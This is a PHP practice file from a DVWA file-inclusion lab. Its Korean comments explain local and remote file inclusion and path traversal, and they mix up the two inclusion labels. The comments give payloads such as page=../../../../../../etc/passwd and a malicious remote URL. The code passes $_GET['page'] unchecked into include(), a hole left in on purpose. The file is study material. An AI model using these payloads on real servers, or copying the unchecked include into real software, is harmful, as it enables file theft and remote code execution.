<!--주로 php기반 웹페이지에서 발생한다
이는 include 기능떄문
local file inclusion (LFI)
이미 시스템에 존재하는 파일을 잍클루드
remote file inclusion (RFI)
외부에 있는 파일을  원격으로 인클루드

웹 어플리케이션이 따로 입력값을 검사하지 않으면 해커가 자기 서버를 만들고
서버를 include 시켜서 원하는 명령어를 실행시키도록 한다.



---local file inclusion (LFI)----------------------------------------------------------------------------------------------------------------
특정 웹 페이지에서 어떤 변수가 include 되는 변수라면 반드시 보안해야하는 이유가 이것 때문
만약 안되어있다면 이 파일을 예시로
page=http://해커사이트주소/악성파일
값을 주게 되면 악성파일이 웹페이지 안에서 실행되게 된다.

ex)
http://localhost/3.dvwa/4.File%20Inclusion/4-1.FI.php?page=zbad.php

----------------------------------------------------------------------------------------------------------------
여기서
주의점 https://e2xist.tistory.com/731
왠만하면 php 자체보안으로 http://~~ 주소를 include 못하게 막아놓기 떄문에
php.ini의 설정을 바꿔놓지 않는 이상 공격실습 중 다른 서버에 악성파일을 만들어 놓고 실행하는 공격실습은 실행되지 않을 것이다
그걸 include.php 파일에서

if( !ini_get( 'allow_url_include' ) )

이렇게 되있는 조건문으로 걸어놓은게  이 실습이 되는지 안되는지 확인하기 위한 코드이다ex)
http://localhost/3.dvwa/4.File%20Inclusion/4-1.FI.php?page=https://mailinnence.github.io/-Dvwa-4.FI/index.html
그냥 이렇게 한다는 정도만 알고 넘어가자
----------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------------------------------------





---remote file inclusion (RFI)---------------------------------------------------------------------------------------------------------------
LFI 보단 강하진 않지만
include 와 관련있는 변수에다가 /etc/passwd 같은 시스템상 중요한 파일을 간레조 추가시키는 것이다.

내 컴퓨터 기준
ex)
http://localhost/3.dvwa/4.File%20Inclusion/4-1.FI.php?page=C:\Users\tjdalsdn00\Desktop\program\이어서 공부할 코딩\Ajax-XMLHttpRequest.txt

dvwa 기준
ex)
page=/etc/passwd

패스 트래버설 공격 (path traveral)
리눅스에서는 ../를 하면 현재 디렉터리의 상쉬 디렉터리로 이동이 가능해진다.
윈도우에서는 ..\를 하면 현재 디렉터리의 상쉬 디렉터리로 이동이 가능해진다.

dvwa 기준(리늑스)
ex)
page=../../../../../../etc/passwd

패스 트래버설 공격 (path traveral)
서버를 분석하고 타고 들어가서 구조 뿐만 아니라 허가받지 않은 파일을 다운받아 가는 경우가 있다.
---------------------------------------------------------------------------------------------------------------------------------------------
-->


<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
<div id="main_body">
<h1>-low-</h1>

</div>
</body>
<?php
include "C:\\xampp\\htdocs\\3.dvwa\\1-1.fi.php";
$file = $_GET[ 'page' ];
if( isset( $file ) )
    include( $file );
else {
    header( 'Location:?page=include.php' );
    //브라우저를 리다이렉트한다
    //https://blog.naver.com/PostView.nhn?blogId=okwizard&logNo=70100359048
    exit;
}
//$file이 있다면 포함 없다면 Location:?page=include.php로 맟춘다


dvwaHtmlEcho( $page );
//$page 를 준다
?>



</html>



